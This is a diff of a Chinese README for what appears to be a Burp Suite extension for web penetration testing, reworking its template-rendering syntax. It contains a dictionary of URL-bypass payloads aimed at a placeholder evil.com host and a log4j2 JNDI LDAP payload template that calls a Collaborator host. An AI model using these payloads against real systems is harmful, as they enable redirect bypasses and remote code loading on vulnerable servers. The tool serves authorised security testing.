@@ -21,6 +21,41 @@
 
 `config.yaml`中的配置解释见 [配置解读](#配置解读) 部分
 
+# 基础能力
+
+> 该项目倾向于写一些表达式来代替繁琐的配置，因此以下两项渲染能力几乎贯穿所有功能。
+
+## 表达式渲染
+
+```java
+Request request = Request.of("https://www.baidu.com");
+String template = "request.host";
+
+HashMap<String, Object> env = new HashMap<>();
+env.put("request", request);
+
+String res = Render.renderExpression(template, env);
+// www.baidu.com
+```
+
+## 字符串渲染
+
+> 引擎会将${expression}或${expression}中的expression当作表达式执行再渲染，当$或@需要作为其本身使用时，需要双写转义，如 [6.1 单个插入](#6.1 单个插入) 中的log4j2 的payload
+
+```java
+URL originUrl = new URL("https://www.baidu.com");
+URL evilUrl = new URL("https://www.evil.com");
+String template = "${request.protocol}://${evilUrl.host}%ff.${request.host}";
+
+HashMap<String, Object> env = new HashMap<>();
+env.put("originUrl", originUrl);
+env.put("evilUrl", originUrl);
+
+String res = Render.renderTemplate("${request.protocol}://${evilUrl.host}%ff.${request.host}", env);
+// https://www.evil.com%ff.www.baidu.com
+```
+
+
 # 功能梳理
 
 标题带*为待实现
@@ -161,21 +196,21 @@ httpTrafficAutoModificationConfig:
 `dict/bypassUrlDict.txt`文件内容
 
 ```
-${mv:originUrl.getProtocol()}://${mv:evilUrl.getHost()}
-//${mv:evilUrl.getHost()}
-${mv:originUrl.getProtocol()}://${mv:originUrl.getHost()}.${mv:evilUrl.getHost()}
-${mv:originUrl.getProtocol()}://${mv:evilUrl.getHost()}?${mv:originUrl.getHost()}
-${mv:originUrl.getProtocol()}://${mv:evilUrl.getHost()}/${mv:originUrl.getHost()}
-${mv:originUrl.getProtocol()}://${mv:evilUrl.getHost()}%ff@${mv:originUrl.getHost()}
-${mv:originUrl.getProtocol()}://${mv:evilUrl.getHost()}%ff.${mv:originUrl.getHost()}
-${mv:originUrl.getProtocol()}://${mv:originUrl.getHost()}%25253F@${mv:evilUrl.getHost()}
-${mv:originUrl.getProtocol()}://${mv:originUrl.getHost()}%253F@${mv:evilUrl.getHost()}
-${mv:originUrl.getProtocol()}://${mv:originUrl.getHost()}%3F@${mv:evilUrl.getHost()}
-${mv:originUrl.getProtocol()}://${mv:originUrl.getHost()}@${mv:evilUrl.getHost()}
-${mv:originUrl.getProtocol()}://foo@${mv:evilUrl.getHost()}:80@${mv:originUrl.getHost()}
-${mv:originUrl.getProtocol()}://foo@${mv:evilUrl.getHost()}%20@${mv:originUrl.getHost()}
-${mv:originUrl.getProtocol()}://foo@${mv:evilUrl.getHost()}%09@${mv:originUrl.getHost()}
-${mv:originUrl.getProtocol()}://${mv:evilUrl.getHost()}[@${mv:originUrl.getHost()}
+${originUrl.protocol}://${evilUrl.host}
+//${evilUrl.host}
+${originUrl.protocol}://${originUrl.host}.${evilUrl.host}
+${originUrl.protocol}://${evilUrl.host}?${originUrl.host}
+${originUrl.protocol}://${evilUrl.host}/${originUrl.host}
+${originUrl.protocol}://${evilUrl.host}%ff@@${originUrl.host}
+${originUrl.protocol}://${evilUrl.host}%ff.${originUrl.host}
+${originUrl.protocol}://${originUrl.host}%25253F@@${evilUrl.host}
+${originUrl.protocol}://${originUrl.host}%253F@@${evilUrl.host}
+${originUrl.protocol}://${originUrl.host}%3F@@${evilUrl.host}
+${originUrl.protocol}://${originUrl.host}@@${evilUrl.host}
+${originUrl.protocol}://foo@@${evilUrl.host}:80@@${originUrl.host}
+${originUrl.protocol}://foo@@${evilUrl.host}%20@@${originUrl.host}
+${originUrl.protocol}://foo@@${evilUrl.host}%09@@${originUrl.host}
+${originUrl.protocol}://${evilUrl.host}[@@${originUrl.host}
 ```
 
 ![image-20240607151802823](images/image3.png)
@@ -330,10 +365,10 @@ ${mv:originUrl.getProtocol()}://${mv:evilUrl.getHost()}[@${mv:originUrl.getHost(
 ```yaml
 payloadConfig: 
   log4j2:
-    simple: "$${jndi:ldap://${mv:BurpUtil.generateCollaboratorPayload()}}"
+    simple: "$${jndi:ldap://${BurpUtil.generateCollaboratorPayload()}}"
 ```
 
-> 此处{jndi前使用双$是因为该payload格式与common-text渲染字符串的格式正好相符，两个$$相当于转义
+> 此处{jndi前使用双$是因为该payload格式与渲染字符串的表达式标记格式正好相符，两个$$相当于转义
 
 此时在Repeater模块右键 ，可以逐级找到名为simple的MenuItem，点击后即可生成Payload到鼠标选择的位置
 
@@ -353,38 +388,6 @@ payloadConfig:
 
 ![image-20240607161730235](images/image16.png)
 
-# 基础能力
-
-## 表达式执行
-
-利用MVEL
-
-```java
-Request request = Request.of("https://www.baidu.com");
-String template = "request.getHost()";
-
-HashMap<String, Object> env = new HashMap<>();
-env.put("request", request);
-
-String res = (String) MVEL.eval(template, env);
-// www.baidu.com
-```
-
-## 字符串渲染
-
-利用MVEL + common-text
-```java
-URL originUrl = new URL("https://www.baidu.com");
-URL evilUrl = new URL("https://www.evil.com");
-String template = "${mv:request.getProtocol()}://${mv:evilUrl.getHost()}%ff.${mv:request.getHost()}";
-
-HashMap<String, Object> env = new HashMap<>();
-env.put("originUrl", originUrl);
-env.put("evilUrl", originUrl);
-
-String res = (String) Render.renderStr("${mv:request.getProtocol()}://${mv:evilUrl.getHost()}%ff.${mv:request.getHost()}", env);
-// https://www.evil.com%ff.www.baidu.com
-```
 
 # 配置解读
 
